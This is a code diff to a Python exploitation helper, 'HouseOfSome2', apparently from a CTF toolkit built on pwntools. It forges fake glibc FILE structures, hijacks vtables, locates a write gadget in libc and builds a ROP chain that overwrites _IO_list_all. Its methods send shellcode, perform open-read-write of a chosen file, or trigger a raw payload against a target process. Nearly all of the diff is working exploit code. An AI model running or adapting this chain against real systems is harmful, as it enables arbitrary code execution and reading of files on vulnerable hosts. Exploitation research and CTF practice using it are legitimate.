@@ -390,24 +390,32 @@ class HouseOfSome2:
                 0xd8: self._IO_wfile_jumps_maybe_mmap - 0x18,
             }, filler=b"\x00")
 
-    def bomb_prepare(self, io: tube, first_fake_file_addr: int, mov_qword_rsi_rdi: int = 0):
+    def bomb_prepare(self, io: tube, first_fake_file_addr: int = 0, mov_qword_rsi_rdi: int = 0):
         if mov_qword_rsi_rdi == 0:
             mov_qword_rsi_rdi = next(self.libc.search(b'H\x89>\xc3', executable=True))
-            log.info(f"Default mov_qword_rsi_rdi found: {mov_qword_rsi_rdi:#x}")
+            log.info(f"Default `mov qword ptr [rsi], rdi; ret;` found: {mov_qword_rsi_rdi:#x}")
         log.success(f"`mov qword ptr [rsi], rdi; ret;` gadget found: {mov_qword_rsi_rdi:#x}")
         rop = ROP(self.libc)
-        rop.rdi = first_fake_file_addr
+        if first_fake_file_addr == 0:
+            rop.rdi = self.fake_stdout_addr + 0x1c8
+        else:
+            rop.rdi = first_fake_file_addr
         rop.rsi = self.libc.symbols['_IO_list_all']
         rop.raw(mov_qword_rsi_rdi)
         rop.call('exit')
         rop_chain = rop.chain()
         log.info(rop.dump())
 
+        if first_fake_file_addr == 0: # if first_fake_file_addr == 0, use hos.get_first_fake_file()
+            first_fake_file = self.hos.get_first_fake_file()
+        else:
+            first_fake_file = b""
+
         io.send(flat({
             0x8: self.fake_stdout_addr, # 需要可写地址
             
             0x38: self.fake_stdout_addr - 0x1c8 + 0xc8, # _IO_buf_base
-            0x40: self.fake_stdout_addr + 0x1c8, # _IO_buf_end
+            0x40: self.fake_stdout_addr + 0x1c8 + len(first_fake_file), # _IO_buf_end
             0xa0: self.fake_stdout_addr + 0xe0,   
             0xc0: p32(0xffffffff),
             
@@ -436,27 +444,29 @@ class HouseOfSome2:
 
                 0xd8: self._IO_default_xsgetn - 0x90, # vtable
                 0x08: self.fake_stdout_addr - 0x1c8, # _IO_read_ptr
-                0x10: self.fake_stdout_addr + (0x1c8 - 0xc8), # _IO_read_end
+                0x10: self.fake_stdout_addr + (0x1c8 - 0xc8) + len(first_fake_file), # _IO_read_end
 
                 0xe0: {
                     0xe0: self._IO_wfile_jumps_maybe_mmap
                 }
-        }
+            },
+            0x100+0x1c8: first_fake_file
         }, filler=b"\x00"))
-    
+
+        
     def bomb(self, io: tube, fake_stdout_addr: int, retn_addr=0, offset=0):
         self.bomb_prepare(io, fake_stdout_addr)
         self.hos.bomb(io, retn_addr, offset)
     
-    def bomb_orw(self, io: tube, fake_stdout_addr: int, file_path: bytes, read_length: int=0x40, retn_addr=0, offset=0):
+    def bomb_orw(self, io: tube, file_path: bytes, read_length: int=0x40, fake_stdout_addr: int = 0, retn_addr=0, offset=0):
         self.bomb_prepare(io, fake_stdout_addr)
         self.hos.bomb_orw(io, file_path, read_length, retn_addr, offset)
     
-    def bomb_shellcode(self, io: tube, fake_stdout_addr: int, shellcode: bytes, pop_rax_call_rax: int=0, retn_addr=0, offset=0):
+    def bomb_shellcode(self, io: tube, shellcode: bytes, pop_rax_call_rax: int=0, fake_stdout_addr: int = 0, retn_addr=0, offset=0):
         self.bomb_prepare(io, fake_stdout_addr)
         self.hos.bomb_shellcode(io, shellcode, pop_rax_call_rax, retn_addr, offset)
     
-    def bomb_raw(self, io: tube, fake_stdout_addr: int, retn_addr=0, offset=0):
+    def bomb_raw(self, io: tube, fake_stdout_addr: int = 0, retn_addr=0, offset=0):
         self.bomb_prepare(io, fake_stdout_addr)
         return self.hos.bomb_raw(io, retn_addr, offset)
 
